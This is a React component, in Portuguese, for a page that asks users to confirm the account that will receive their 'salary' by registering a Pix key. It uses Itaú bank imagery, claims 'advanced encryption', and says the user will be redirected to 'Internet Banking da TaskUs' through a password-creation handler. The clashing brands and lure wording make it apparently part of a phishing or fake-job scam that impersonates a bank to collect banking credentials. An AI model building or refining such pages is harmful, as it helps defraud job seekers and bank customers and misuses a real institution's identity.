/* eslint-disable no-unused-vars */
import React, { useState } from 'react';
// eslint-disable-next-line no-unused-vars
import { motion } from 'framer-motion';
import ItauElementMin from '../../assets/itau_element-min.webp';
import '../../styles/refino.css';
import Maintexts from "../modules/Main-texts";
import Headlines from "../modules/Headlines";
import Paragraphs from "../modules/Paragraphs";
import ExplanatoryCards from "../modules/ExplanatoryCards";

/* ===== Ícones simples para os cards (usam currentColor) ===== */
const BadgeIcon = (props) => (
  <svg viewBox="0 0 24 24" aria-hidden="true" {...props}>
    <path
      fill="currentColor"
      fillRule="evenodd"
      d="M19.777 8.738c.361.361.693.693.948.994c.275.323.546.706.705 1.194a3.47 3.47 0 0 1 0 2.147c-.159.489-.43.872-.705 1.195c-.255.3-.587.633-.948.994l-4.515 4.515a18 18 0 0 1-.994.948c-.323.275-.707.546-1.195.705a3.48 3.48 0 0 1-2.147 0c-.488-.159-.87-.43-1.195-.705c-.3-.255-.632-.587-.993-.948l-4.515-4.515a18 18 0 0 1-.948-.994c-.275-.323-.546-.706-.705-1.195a3.47 3.47 0 0 1 0-2.147c.159-.488.43-.87.705-1.194c.254-.3.586-.633.948-.994l4.515-4.515c.361-.361.693-.693.993-.948c.324-.275.707-.546 1.195-.705a3.47 3.47 0 0 1 2.147 0c.489.159.872.43 1.195.705c.3.255.632.586.994.948zm-2.343-.237l1.253 1.253c.787.786 1.18 1.18 1.327 1.633c.13.398.13.828 0 1.226c-.147.454-.54.847-1.327 1.633l-1.253 1.253h-1.513a.8.8 0 0 1-.598-.28l-1.946-2.14a1.86 1.86 0 0 0-2.754 0l-1.947 2.14a.8.8 0 0 1-.597.28H6.565l-1.253-1.253c-.786-.786-1.179-1.18-1.326-1.633a2 2 0 0 1 0-1.226c.147-.454.54-.847 1.326-1.633l1.253-1.253H8.08c.209 0 .426.09.597.28l1.947 2.14a1.86 1.86 0 0 0 2.754 0l1.946-2.14a.8.8 0 0 1 .598-.28zm-1.489-1.489h-.024c-.652 0-1.262.286-1.7.767L12.276 9.92a.37.37 0 0 1-.55 0L9.778 7.78a2.3 2.3 0 0 0-1.7-.768h-.024l1.7-1.7c.786-.786 1.18-1.179 1.632-1.326c.4-.13.829-.13 1.227 0c.454.147.847.54 1.633 1.327zm-.024 9.976h.024l-1.7 1.7c-.785.786-1.178 1.179-1.632 1.326c-.398.13-.828.13-1.227 0c-.453-.147-.846-.54-1.632-1.327l-1.7-1.7h.025c.652 0 1.261-.285 1.699-.766l1.947-2.141a.37.37 0 0 1 .55 0l1.947 2.14a2.3 2.3 0 0 0 1.7.768"
      clipRule="evenodd"
    />
  </svg>
);

const ShieldCheckIcon = (props) => (
  <svg viewBox="0 0 24 24" aria-hidden="true" {...props}>
    <g fill="none" stroke="currentColor" strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5">
      <path d="M11.998 2C8.99 2 7.04 4.019 4.734 4.755c-.938.3-1.407.449-1.597.66c-.19.21-.245.519-.356 1.135c-1.19 6.596 1.41 12.694 7.61 15.068c.665.255.998.382 1.61.382s.946-.128 1.612-.383c6.199-2.373 8.796-8.471 7.606-15.067c-.111-.616-.167-.925-.357-1.136s-.658-.36-1.596-.659C16.959 4.019 15.006 2 11.998 2" />
      <path d="M9 13s1 0 2 2c0 0 3.177-5 6-6" />
    </g>
  </svg>
);

const PaymentCreateAccountStep = ({ onCriarSenha }) => {
  const [loading, setLoading] = useState(false);

  const continuar = async () => {
    setLoading(true);
    setTimeout(async () => {
      await onCriarSenha();
      setLoading(false);
    }, 1000);
  };

  /* ===== Conteúdo para os ExplanatoryCards ===== */
  const supportTypes = [
    {
      id: 'lgpd',
      icon: BadgeIcon,
      title: 'Cadastre sua chave Pix',
      description: (
        <>
          Escolha o banco, selecione o tipo de chave Pix e confirme sua conta.É rápido, leva menos de 1 minuto.
        </>
      ),
    },

  ];

  return (
    <div className="min-h-screen flex flex-col items-center bg-[#0a0026] px-2 pt-10">
      <div className="w-full max-w-md mx-auto">
        {/* Texto principal */}
        <Maintexts>
          <section id='ETP7T1'/>
          <Headlines variant="white">
            Para continuar, <br/> precisamos confirmar a <br/> conta que você vai<br/>  receber seu salário.
          </Headlines>
          <Paragraphs variant="white">
            Essa confirmação é feita apenas uma<br/> vez e garante que o pagamento seja<br/> transferido diretamente para você,<br/> com total segurança.
          </Paragraphs>
        </Maintexts>

        {/* Avisos com ExplanatoryCards (substitui os blocos com *) */}
        <div className="mt-4 mb-8">
          <ExplanatoryCards supportTypes={supportTypes} />
        </div>

     
        <div
          className="bg-white rounded-2xl pt-6 pb-2 mb-25 flex flex-col items-center shadow"
          style={{ minHeight: '320px' }}
        >
         <div className="w-full flex flex-col items-center">
                <div className="flex items-center gap-2 mb-2 mt-1">
                  <ShieldCheckIcon
                    className="w-5 h-5"
                    style={{ color: '#1655ff' }} // azul padrão da marca
                  />
                  <span
                    className="font-hendrix-regular text-gray-400 text-xs"
                    style={{ letterSpacing: '0.2px' }}
                  >
                    Criptografia avançada.
                  </span>
                </div>

                <img
                  src={ItauElementMin}
                  alt="Elemento Itaú"
                  className="h-95 w-auto p-4"
                />
              </div>
          <div className="w-full text-center mt-2 mb-2">
            <p className="koap font-hendrix-regular text-gray-700 text-base" style={{ fontSize: '15px' }}>
              Você será direcionado(a) para o<br /> <b>Internet Banking da TaskUs.</b>
            </p>
          </div>
          <motion.button
            type="button"
            onClick={continuar}
            disabled={loading}
            whileTap={{ scale: 0.97 }}
            whileHover={{ scale: loading ? 1 : 1.03 }}
            className={`w-[90%] flex items-center mt-3 justify-center mb-3 gap-2 px-5 py-3 rounded-full font-hendrix-medium text-white shadow-md focus:outline-none focus:ring-2 transition-all duration-300 bg-blue-500 hover:bg-blue-600 mb-2 ${loading ? 'cursor-not-allowed' : ''}`}
            style={{
              fontSize: '14pt',
              boxShadow: '0 2px 8px 0 rgba(255,140,0,0.10)',
              border: 'none',
              opacity: loading ? 0.7 : 1
            }}
          >
            {loading ? (
              <>
                <motion.div
                  className="w-4 h-4 border-2 border-white border-t-transparent rounded-full mr-2"
                  animate={{ rotate: 360 }}
                  transition={{ repeat: Infinity, duration: 0.8, ease: 'linear' }}
                  style={{ borderTopColor: 'transparent', borderRightColor: 'white', borderBottomColor: 'white', borderLeftColor: 'white' }}
                />
                <span className="font-hendrix-medium tracking-wide" style={{ fontSize: '12pt' }}>Direcionando...</span>
              </>
            ) : (
              <span className="font-hendrix-medium tracking-wide" style={{ fontSize: '12pt' }}>Cadastrar Chave</span>
            )}
          </motion.button>
     
        </div>
      </div>
    </div>
  );
};

export default PaymentCreateAccountStep;